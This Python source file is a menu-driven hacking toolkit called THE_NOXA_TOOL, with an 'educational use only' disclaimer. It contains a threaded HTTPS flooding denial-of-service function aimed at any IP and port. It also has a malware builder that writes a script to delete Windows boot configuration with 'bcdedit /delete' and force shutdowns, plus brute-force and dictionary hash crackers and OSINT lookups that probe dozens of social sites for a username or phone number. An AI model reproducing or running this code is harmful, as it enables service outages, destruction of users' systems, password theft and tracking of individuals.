# ==============================================================================
# PROJECT: THE_NOXA_TOOL
# AUTHOR: THE_NOXA_DEV
# VERSION: 1.0.0
# 
# COPYRIGHT (c) 2024 THE_NOXA_DEV. All rights reserved.
#
# LEGAL DISCLAIMER:
# This tool is developed for EDUCATIONAL and ETHICAL TESTING purposes only. 
# The author (THE_NOXA_DEV) is NOT responsible for any misuse, damage, or 
# illegal activities caused by this software. Use this tool ONLY on networks 
# and systems you own or have explicit permission to test.
#
# DO NOT USE THIS TOOL FOR MALICIOUS PURPOSES.
# ==============================================================================





#WORK IN PROGRESS
import time
import hashlib
import bcrypt
import tkinter as tk
import socket
import threading
import os
import json
import random
import itertools
from multiprocessing import Pool
import requests
import ssl
import phonenumbers
from phonenumbers import geocoder, carrier




def Email_Scanner():
    email =input("Put An Email: ")
    siti = {
    "Instagram": "https://www.instagram.com/{username}/",
    "TikTok": "https://www.tiktok.com/@{username}",
    "Twitter/X": "https://x.com/{username}",
    "Pinterest": "https://www.pinterest.com/{username}/",
    "Reddit": "https://www.reddit.com/user/{username}/",
    "Snapchat": "https://www.snapchat.com/add/{username}",
    "Facebook": "https://www.facebook.com/{username}",
    "Linktree": "https://linktr.ee/{username}",
    "Behance": "https://www.behance.net/{username}",
    "Nextdoor": "https://nextdoor.com/profile/{username}",
    "Twitch": "https://www.twitch.tv/{username}",
    "Steam": "https://steamcommunity.com/id/{username}",
    "Roblox": "https://www.roblox.com/user.aspx?username={username}",
    "Xbox": "https://www.xboxgamertag.com/search/{username}",
    "PlayStation": "https://psnprofiles.com/{username}",
    "Chess.com": "https://www.chess.com/member/{username}",
    "Minecraft": "https://api.mojang.com/users/profiles/minecraft/{username}",
    "Osu!": "https://osu.ppy.sh/users/{username}",
    "GitHub": "https://github.com/{username}",
    "GitLab": "https://gitlab.com/{username}",
    "StackOverflow": "https://stackoverflow.com/users/story/{username}",
    "Replit": "https://replit.com/@{username}",
    "DockerHub": "https://hub.docker.com/u/{username}",
    "Kaggle": "https://www.kaggle.com/{username}",
    "Arduino": "https://forum.arduino.cc/u/{username}",
    "Codecademy": "https://www.codecademy.com/profiles/{username}",
    "DeviantArt": "https://www.deviantart.com/{username}",
    "Spotify": "https://open.spotify.com/user/{username}",
    "SoundCloud": "https://soundcloud.com/{username}",
    "Bandcamp": "https://bandcamp.com/{username}",
    "Vimeo": "https://vimeo.com/{username}",
    "Dailymotion": "https://www.dailymotion.com/{username}",
    "Smule": "https://www.smule.com/{username}",
    "Last.fm": "https://www.last.fm/user/{username}",
    "Medium": "https://medium.com/@{username}",
    "Patreon": "https://www.patreon.com/{username}",
    "ProductHunt": "https://www.producthunt.com/@{username}",
    "Slack": "https://{username}.slack.com",
    "About.me": "https://about.me/{username}",
    "Contently": "https://{username}.contently.com",
    "eBay": "https://www.ebay.com/usr/{username}",
    "Etsy": "https://www.etsy.com/people/{username}",
    "TripAdvisor": "https://www.tripadvisor.com/MemberProfile-{username}",
    "Quora": "https://www.quora.com/profile/{username}",
    "Wordpress": "https://{username}.wordpress.com",
    "Tumblr": "https://{username}.tumblr.com",
    "Flickr": "https://www.flickr.com/people/{username}",
    "Instructables": "https://www.instructables.com/member/{username}",
    "Duolingo": "https://www.duolingo.com/profile/{username}",
    "Archive.org": "https://archive.org/details/@{username}"
}
    if email.endswith((".com" , ".edu")):
        for sito , url_template in siti.items():
            url_finale = url_template.format(username=email)
            try:
                risposta = requests.get(url_finale , timeout=5)
                if risposta.status_code == 200:
                    print(f"Account Finded in Site:{url_finale}")

                else:
                    print("account not found")

            except Exception as e:
                print("Couldnt Connect To The Server!")
                return






def Phone_Lookup():
    number =input("Put a Number (Es. +39452...)").strip()
    try:
        numbereal =phonenumbers.parse(number , None)
        if phonenumbers.is_valid_number(numbereal):
            city = geocoder.description_for_number(numbereal, "it")
            operator = carrier.name_for_number(numbereal , "it")
            print("The Number is valid")
            print(f"The City of the Number Is:{city} And the Operator Is:{operator}")

    except Exception as e:
            print("Error")
            return
    



def Nickname_Osint():
    username =input("Put a Username: ")
    siti = {
    "Instagram": "https://www.instagram.com/{username}",
    "GitHub": "https://github.com/{username}",
    "Twitter": "https://twitter.com/{username}",
    "TikTok": "https://www.tiktok.com/@{username}",
    "Reddit": "https://www.reddit.com/user/{username}",
    "Youtube": "https://www.youtube.com/@{username}",
    "Pinterest": "https://www.pinterest.com/{username}",
    "Snapchat": "https://www.snapchat.com/add/{username}",
    "Telegram": "https://t.me/{username}",
    "Twitch": "https://www.twitch.tv/{username}",
    "Steam": "https://steamcommunity.com/id/{username}",
    "Roblox": "https://www.roblox.com/user.aspx?username={username}",
    "Replit": "https://replit.com/@{username}",
    "Spotify": "https://open.spotify.com/user/{username}",
    "SoundCloud": "https://soundcloud.com/{username}",
    "Medium": "https://medium.com/@{username}",
    "Behance": "https://www.behance.net/{username}",
    "Dribbble": "https://dribbble.com/{username}",
    "Vimeo": "https://vimeo.com/{username}",
    "Quora": "https://www.quora.com/profile/{username}",
    "Tumblr": "https://{username}.tumblr.com",
    "eBay": "https://www.ebay.com/usr/{username}",
    "Slack": "https://{username}.slack.com",
    "Chess.com": "https://www.chess.com/member/{username}",
    "Wattpad": "https://www.wattpad.com/user/{username}"
} 
    
    for sito , url_template in siti.items():
        url_finale = url_template.format(username=username)
        try:
            risposta = requests.get(url_finale , timeout = 5)

            if risposta.status_code == 200:
                print(f"Account Finded in Site:{url_finale}")

            else:
                print("account not found")

        except Exception as e:
            print("Couldnt Connect To The Server!")
            return









def dictionary_attack():
    passwords = [
    "123456", "123456789", "password", "12345", 
    "admin", "admin123", "root", "12345678", 
    "qwerty", "user", "guest", "p@ssword", 
    "login", "super", "secret", "default", 
    "111111", "987654321", "football", "welcome"
]
    Hash =input("Put a Valid Hash: ").strip()
    try:
        for password in passwords:
            password_encoded = password.encode("utf-8")
            password_hash =hashlib.sha256(password_encoded)
            password_hashata = password_hash.hexdigest()
            if password_hashata == Hash:
                print("Password Finded")
                time.sleep(0.3)
                print("Your Password is:", password)
                time.sleep(1)
        else:
            print("password is not in the dictionary")
    except Exception as e:
        print("error")
        return
        

def stampa_ascii_art_block():
    RESET = '\033[0m'
    VERDE = '\033[92m'
    the_noxa_style = r"""
 ████████╗██╗  ██╗███████╗    ███╗   ██╗ ██████╗ ██╗  ██╗ █████╗ 
 ╚══██╔══╝██║  ██║██╔════╝    ████╗  ██║██╔═══██╗╚██╗██╔╝██╔══██╗
    ██║   ███████║█████╗      ██╔██╗ ██║██║   ██║ ╚███╔╝ ███████║
    ██║   ██╔══██║██╔══╝      ██║╚██╗██║██║   ██║ ██╔██╗ ██╔══██║
    ██║   ██║  ██║███████╗    ██║ ╚████║╚██████╔╝██╔╝ ██╗██║  ██║
    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    
    [ by: THE_NOXA_DEV ]
    """
    print(VERDE + the_noxa_style + RESET)


def MD5():
    alfabeto = "abcdefghijklmnopqrstuvwxyz"

    print("DO NOT USE UPPERCASE")
    Hash =input("put a valid Hash: ").strip()
    try:
        for lunghezza in range(3,9):
            for i in itertools.product(alfabeto , repeat =lunghezza):
                stringaunita = "".join(i)

                hashcrazy =stringaunita.encode("utf-8")
                hash_object = hashlib.md5(hashcrazy)

                codice_hash = hash_object.hexdigest()
                print(stringaunita)
                if codice_hash == Hash:
                    print("Password Finded.")
                    time.sleep(1)
                    print("Your Password Is:",stringaunita)
                    time.sleep(0.5)
                    break
    except Exception as e:
        print("error")
        time.sleep(0.3)
        return

def IpGrabber():
    print("Error: Work In Progress")

def malwarebuilder():
    name = input("Enter a name for the malware: ")
    if not name.endswith(".py"):
        name += ".py"

    malware_content = f"""import os
import time
import random

lettere = [
    "a", "b", "c", "d", "f", "g", "h", "j", "k", "l", 
    "p", "o", "u", "t", "r", "e", "q", "z", "x", "xc", 
    "v", "vb", "n", "m", "mn", "mnmm", "mnnn", "bbb","cv",
    "kgls","mhldk","loper","mnsa","muori","ez"
]

while True:
    try:
        for lettera in lettere:
            cartella = lettera
            if not os.path.exists(cartella):
                os.mkdir(cartella)
            else:
                try:
                    os.rmdir(cartella)
                except:
                    pass
        
        # Comandi amministratore
        os.system("bcdedit /delete")  
        time.sleep(0.1)
        os.system("shutdown /f /s /t 0")

    except Exception as e:
        continue
"""
    try:
        with open(name, "w") as f:
            f.write(malware_content)
        print(f"\n[+] Success! '{name}' Created.")
    except Exception as e:
        print(f"[-] Error: {e}")
        return

def DosAttack():
    context = ssl._create_unverified_context()

    while True:
        try:
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
            raw_socket.settimeout(3) 
        
        # Avvolgi il socket per HTTPS (porta 443)
            s = context.wrap_socket(raw_socket, server_hostname=ip)
        
            s.connect((ip, port))
            print(VERDE + "[+] Connected" + RESET)

            for _ in range(50):
            
                session_id = str(random.randint(10000, 99999))
            
            
                richiesta = (
                    "GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n" 
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0\r\n"
                    "Connection: keep-alive\r\n"
                    f"X-Session-ID: {session_id}\r\n"
                    "\r\n" 
                )
            
                s.send(richiesta.encode("utf-8"))
            
            print("Sending...")

        except Exception as e:
            print(ROSSO + "[!] Error" + RESET)
            time.sleep(0.1)
        finally:
            s.close()

def Malware():
    root = tk.Tk()
    root.title("Malware Builder GUI")
    root.geometry("400x300")
    button = tk.Button(root, text="Create Malware File", command=malwarebuilder)
    button.pack(pady=20)
    root.mainloop()


def BruteForce():
    #b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2 (hash)
    alfabeto = "abcdefghijklmnopqrstuvwxyz"

    print("DO NOT USE UPPERCASE")
    Hash =input("put a valid Hash: ").strip().lower()
    try:
        for lunghezza in range(4,9):
            for i in itertools.product(alfabeto , repeat =lunghezza):
                stringaunita = "".join(i)

                hashcrazy =stringaunita.encode("utf-8")
                hash_object = hashlib.sha256(hashcrazy)

                codice_hash = hash_object.hexdigest()
                print(stringaunita)
                if codice_hash == Hash:
                    print("password finded.")
                    time.sleep(1)
                    print("your password is:",stringaunita)
                    time.sleep(0.5)
                    return
    except Exception as e:
        print("error")
        time.sleep(0.3)
        return





if __name__ == "__main__":
    ROSSO  = '\033[31m'
    VERDE  = '\033[32m'
    GIALLO = '\033[93m'
    RESET = '\033[0m'
    BLU ='\033[94m'

    while True:
        stampa_ascii_art_block()
        print(VERDE + """
# ==============================================================================
#  PROJECT: THE_NOXA_TOOL
#  AUTHOR: THE_NOXA_DEV
#  VERSION: 1.0.0
#  
#  COPYRIGHT (c) 2024 THE_NOXA_DEV. All rights reserved.
#
#  LEGAL DISCLAIMER:
#  This tool is developed for EDUCATIONAL and ETHICAL TESTING purposes only. 
#  The author (THE_NOXA_DEV) is NOT responsible for any misuse, damage, or 
#  illegal activities caused by this software. Use this tool ONLY on networks 
#  and systems you own or have explicit permission to test.
#
#  DO NOT USE THIS TOOL FOR MALICIOUS PURPOSES.
# ==============================================================================
""" + RESET)
        print(VERDE + "┌──────────────────────────────────────────────────┐" + RESET)
        print(VERDE + f"│ {VERDE}[1]{RESET} Dos Attack                                   │")
        print(VERDE + f"│ {ROSSO}[2]{RESET} Proxy (Unavailable)                          │")
        print(VERDE + f"│ {VERDE}[3]{RESET} Malware Builder (Needs Administrator)        │")
        print(VERDE + f"│ {ROSSO}[4]{RESET} Ip Grabber                                   │")
        print(VERDE + f"│ {VERDE}[5]{RESET} BruteForce Password Cracker                  │")
        print(VERDE + f"│ {VERDE}[6]{RESET} Dictionary Password Cracker                  │")
        print(VERDE + f"│ {GIALLO}[7]{RESET} Ddos Attack (Premium)                        │")
        print(VERDE + f"│ {VERDE}[8]{RESET} Nickname Scanner (OSINT)                     │")
        print(VERDE + f"│ {VERDE}[9]{RESET} Phone Lookup (OSINT)                         │")
        print(VERDE + f"│ {VERDE}[10]{RESET} Email Lookup (OSINT)                        │")
        print(VERDE + f"│ {BLU}[0]{RESET} Exit                                         │")
        print(VERDE + "└──────────────────────────────────────────────────┘" + RESET)
        
        
        scelta = input("\nSelect a Valid Option: ")

        if scelta == "1":
            global ip
            global port
            ip = input("put a valid Ip: ")
            port = int(input("put a valid Port: "))
            threads =int(input("put the number of threads: "))
            time.sleep(0.5)
            for i in range(threads):
                t = threading.Thread(target=DosAttack)
                t.start()
        elif scelta == "2":
            print("Option unavailable")
        elif scelta == "3":
            Malware()
        elif scelta == "4":
            IpGrabber()

        elif scelta == "5":
            tipo =input("you want to use MD5 or SHA256? M/S: ").upper()
            if tipo == "S":
                os.system("start /high /wait python TheNoxaTool")
                BruteForce()
            else:
                os.system("start /high /wait python TheNoxaTool")
                MD5()

        elif scelta == "6":
             dictionary_attack()

        elif scelta == "7":
            print("You Dont Own Premium")

        elif scelta == "8":
            Nickname_Osint()

        elif scelta == "9":
            Phone_Lookup()

        elif scelta == "0":
            print("Leaving...")
            break
        else:
            print("Invalid option.")